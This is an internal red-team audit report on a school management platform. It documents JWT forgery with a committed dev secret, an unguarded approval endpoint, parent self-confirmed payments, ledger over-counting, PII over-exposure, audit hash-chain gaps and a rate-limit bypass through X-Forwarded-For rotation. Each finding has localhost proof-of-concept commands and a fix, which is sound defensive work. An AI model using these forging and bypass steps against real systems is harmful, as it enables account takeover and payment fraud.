# RTR-001 — Full Adversarial Engagement (Red-Team Lead Report)

**Auditor:** REDTEAM-1 (internal red team / audit) · **Date:** 2026-09-05 · **Scope:** `server/` (Fastify 5, Node 26), `migrations/001–005`, `app/` (React), live API `127.0.0.1:8080`, live frontend `127.0.0.1:4310`, Postgres 18 at `127.0.0.1:5432` (roles `schoolos`, `schoolos_app`).
**Code-state caveat (important):** the tree was modified by a parallel developer *during* this engagement (event spine `004_event_spine.sql`, grants `005_grants_refresh.sql`, `src/governance.js`, `routes.js` §drain landed mid-audit; one failing test self-resolved between two runs). Every CRITICAL/HIGH below was **re-verified against the tree as of `routes.js` mtime 2026-09-05 17:12 IST** — none had been fixed by the parallel changes.
**Rules honored:** read-only on production code; PoC scripts only under `server/tests-rt/` (marked PoC); no traffic beyond 127.0.0.1; one rival tenant created via superuser per RoE.

## 1. Executive verdict

Multi-tenant RLS held against everything I threw at it (rival tenant, forged claims, header/query tampering) — the data layer is genuinely defensible — but the application layer sits on top like a house of cards: a committed JWT secret turns any login into any other account's session, the money path lets a parent settle their own invoice with a fabricated gateway reference and lets two plain sequential API calls over-count a ledger by 200%, and the approval spine that the entire product thesis rests on is unguarded — **a parent account approved a principal-owned action and the platform "delivered" the WhatsApp blast**. Data-minimization is dead code (`roleScope()` is never called), so every parent can read the whole school's guardian phone directory, other children's fee ledgers, and the audit trail itself.

**Risk posture grade: D.** Justification: the crown-jewel tenant isolation (Track A) survived — that is the difference between D and F — but RT-001 (forged tokens = full auth bypass), RT-002 (SoD destroyed), and RT-003/RT-004 (money corruption by the least-privileged role) each independently defeat the platform's core claims (approvals, ledger, money). All four are exploitable today with nothing but a demo parent login and a repo clone.

## 3. Detailed findings (CRITICAL + HIGH)

### RT-001 — CRITICAL: JWT secret in repo ⇒ forge any user's token (full impersonation)
`app.js` `authenticate()` trusts the token's `sub` blindly and re-derives identity from `app.users` (that part is *good* — claim tampering of `role`/`tenant` is inert, proven). But possession of the signing secret is total: the secret is on disk at `server/.env` (`JWT_SECRET=schoolos-dev-secret-2f8a41c9`) with a committed fallback `'dev-only-secret-change-me'` (config.js:15). User uuids are harvestable by any low-priv account (RT-009), so the chain needs no insider knowledge.

Repro (run from `server/tests-rt/`):
```bash
# 1) any parent token (demo password in seed) reads staff uuids:
curl -s http://127.0.0.1:8080/work-orders -H "Authorization: Bearer $PARENT_TOKEN"   # → reported_by: 72887eb3-…
# 2) forge with the repo secret:
node -e "const c=require('crypto');const b64=o=>Buffer.from(JSON.stringify(o)).toString('base64url');
const h={alg:'HS256',typ:'JWT'},p={sub:'72887eb3-1354-4959-9a1c-82f08e5d0f25',iat:Date.now()/1e3|0,exp:Date.now()/1e3+3600|0};
console.log(b64(h)+'.'+b64(p)+'.'+c.createHmac('sha256','schoolos-dev-secret-2f8a41c9').update(b64(h)+'.'+b64(p)).digest('base64url'))" > /tmp/forged
# 3) full account takeover:
curl -s http://127.0.0.1:8080/me -H "Authorization: Bearer $(cat /tmp/forged)"
# → {"id":"72887eb3-...","name":"Vikram Joshi","role":"facilities",...}
```
Also proven: forging with the principal's uuid returned her identity (`/me` → "Dr. Meera Krishnan") and was accepted for owner-gated route attempts. `alg:none` correctly rejected.
**Impact:** complete auth bypass; every `require(...)` guard and every tenant rule becomes the attacker's to choose by picking the victim sub.
**Minimal fix:** secret from environment/vault only (no in-repo default), rotate immediately; optionally pin `jti`/session table for revocation. Effort S.

### RT-002 — CRITICAL: Approval spine unguarded (segregation of duties destroyed)
`POST /actions/:id/decide` uses preHandler `me` (auth only) — no role gate, and the `actions` table never records who/what proposed the action (no `proposed_by`), so SoD is unenforceable even by accident. Actions carry `owner_role:'principal'`; the field is decorative.

Proof (re-verified twice against the final tree):
```bash
# transport desk raises the approval action:
curl -s -X POST :8080/transport/events -d '{"routeCode":"Route 7","kind":"gps_delay","delayMins":12}' -H "$TRANSPORT_TOKEN"
# → action 8609dabe-… "Notify 75 guardians — Bus Route 7 +12 min", owner_role=principal
curl -s -X POST :8080/actions/8609dabe-…/decide -H "$PARENT_TOKEN" -d '{"decision":"approved"}'
# → 200 {"ok":true,"execution":{"type":"communication","id":"22ceedb7-…","status":"delivered"}}
```
The transport role (the proposing path) also approved successfully. Double-decide race is safe (concurrent attempt → 409 `action already approved`; exactly one communication executed) — the failure is authorization, not concurrency.
**Impact:** the "APPROVAL REQUIRED" loop — the product's core control — can be completed by the least-privileged role; mass parent messaging can be triggered by any compromised low-value account; audit trail shows the forgery as a legitimate approval.
**Minimal fix:** `require(owner_role)` + per-action-kind decider matrix + record `proposed_by` and reject proposer. Effort S.

### RT-003 — CRITICAL: Parent self-service payment confirmation (no gateway in the loop)
`POST /fees/payments/:id/confirm` role list includes `parent` (routes.js:158), takes a client-supplied `gatewayRef`, and stamps `status='delivered'` comms + audit entry that literally claims *"Confirmed payment (gateway webhook verified)"* — which is false; there is no webhook path in the codebase at all.

Proof:
```bash
P=$(curl -s -X POST :8080/fees/payments -H "$PARENT_TOKEN" -d '{"obligationId":"07750129-…"}' | jq -r .payment.id)
curl -s -X POST :8080/fees/payments/$P/confirm -H "$PARENT_TOKEN" -d '{"gatewayRef":"PARENT-SAYS-PAID"}'
# → {"payment":{"status":"confirmed","gateway_ref":"PARENT-SAYS-PAID","receipt_no":"RCP-MTOAS5P1",…}}
```
**Impact:** any parent marks any obligation in the tenant settled without money moving; fee ledger and receipts (the "financial audit" primitive docs claim) are corrupted by the least-privileged role.
**Minimal fix:** remove `parent` from confirm; confirm only via a signed webhook route (separate secret, replay protection, amount match). Effort S.

### RT-004 — CRITICAL: Money ledger over-count via double-initiate (no race required)
`POST /fees/payments` reads the obligation **without a lock**, computes `due`, and inserts a payment for the full due amount. There is no uniqueness constraint on open payments per obligation, and `confirm` adds the payment amount to `paid_cents` unconditionally. Sequential calls — no concurrency — over-count the ledger:

Proof (exact transcript):
```bash
OBL=c6ab7002-24ab-492a-b1d8-7c0fc4f62a26   # Term 2 installment, amount_cents=1850000, paid 0
P1=$(… POST /fees/payments …)   # → 91de3728-…  (payment #1, full due)
P2=$(… POST /fees/payments …)   # → 56b381eb-…  (payment #2, full due AGAIN)
confirm P1 → obligation paid: 1850000 (status paid)
confirm P2 → obligation paid: 3700000 (status paid)   # ← 200% of amount, two receipts
```
Notes: concurrent double-**confirm of the same payment** is safe (`FOR UPDATE` + idempotent replay → one ledger write, verified: paid exactly once). Amount tampering is structurally blocked at initiation (server-computed). The corruption window is initiation idempotency.
**Impact:** quiet money corruption — receipts issued against no money; reconciliation "₹0-difference" claims (see RT-018) are fabricated on top.
**Minimal fix:** `SELECT … FOR UPDATE` on the obligation in the initiate tx; re-check `due > 0` under the lock; add `CHECK (paid_cents <= amount_cents)` and a partial unique index on open payments per obligation. Effort S/M.

### RT-005 — HIGH: Systemic PII over-exposure (`roleScope()` is dead code)
`auth.js:21 roleScope()` maps roles to data scopes (`parent → parentOfOnly`) and is referenced **nowhere**. Consequences, all verified live as `parent@meridian.edu`:
- `GET /students` → every student in the school with `guardian_name` + `guardian_phone` (a school-wide parent phone directory; ~1,472 students in seed).
- `GET /students/:id` → any child's full profile + fee history + attendance history.
- `GET /fees/obligations` → school-wide financials (names, amounts, payment status, `TALLY-txn-*` source refs).
- `GET /cases` → discipline cases; `GET /actions`, `/memory`, `/work-orders` (staff uuids → RT-009), `/transport/routes` (vehicle plates), `/audit` (RT-011).
**Minimal fix:** per-role column projection + row scoping (parent → own children via guardians table); delete or implement `roleScope()`. Effort M.

### RT-006 — HIGH: Audit completeness gaps (the auditor's auditor)
`POST /work-orders/:id/status` writes an audit row **only when `to==='resolved'`** (routes.js:286). Every other transition — including the one that wrote `cost_cents=-99999` — leaves **zero** ledger rows (verified: 0 rows referencing WO-1046 after two mutations). Also unaudited: `POST /notifications/read`, failed logins (brute-force attempts are invisible to the ledger). All other mutating routes audited (17/17 counted, reconciled by grep).
**Minimal fix:** audit every transition; add failed-login audit; consider auditing the `idempotent-replay` path of payment confirm. Effort S.

### RT-007 — HIGH: Hash chain is not verifiable from stored data (and genesis is NULL)
Two independent defects:
1. `auditLog()` (audit.js:12–17) hashes material containing `at: new Date().toISOString()` — a timestamp that is **never stored**. Verifier recomputation over stored columns mismatches (proven: stored `b3da1d18…` vs recomputed `c1399398…`).
2. The seed writes directly to `app.audit_log` without `prev_hash`/`hash` (seed.js:237) → row rn=1 is `NULL/NULL`, breaking any from-genesis verification (66 rows total; rows rn≥2 chain correctly — 0 breaks).
**Impact:** the "tamper-evident ledger" cannot be independently verified by an external auditor; the DB-level append-only (RT-016 partial) is the only real control.
**Minimal fix:** hash over stored columns only (or persist the material JSON); backfill the seed row or treat it as GENESIS explicitly. Effort M.

### RT-008 — HIGH: Login rate-limit bypass via XFF rotation
`trustProxy: true` (app.js:13) with no proxy allowlist → `req.ip` is attacker-supplied. 25 same-header attempts → 5×429 (limiter works per-IP); 25 attempts with rotating `X-Forwarded-For` → **0×429**. Global limiter (300/min) bypassable the same way.
**Minimal fix:** set `trustProxy` to specific hops only; rate-limit login by socket address + account. Effort S.

### RT-009 — HIGH: Staff uuid leakage completes the RT-001 kill-chain
`GET /work-orders` (any role) returns `reported_by`/`assigned_to` uuids; `/cases` returns `opened_by`. A parent extracted `72887eb3-…` and forged a valid facilities session (see RT-001 repro). Even without the repo secret, this is an account-identifier oracle for phishing/targeting.
**Minimal fix:** strip actor uuids from low-priv projections (join server-side, expose display names only). Effort S.

### RT-010 — HIGH: `costCents` unvalidated (negative money persisted)
`POST /work-orders/:id/status` passes `req.body?.costCents` straight into `cost_cents` (bigint) at any transition: `{"to":"on-site","costCents":-99999}` → stored. Combined with RT-006 (unaudited) this is a silent money-adjacent corruption primitive for any technician.
**Minimal fix:** integer coercion + `>= 0` + zod schema; audit cost changes. Effort S.
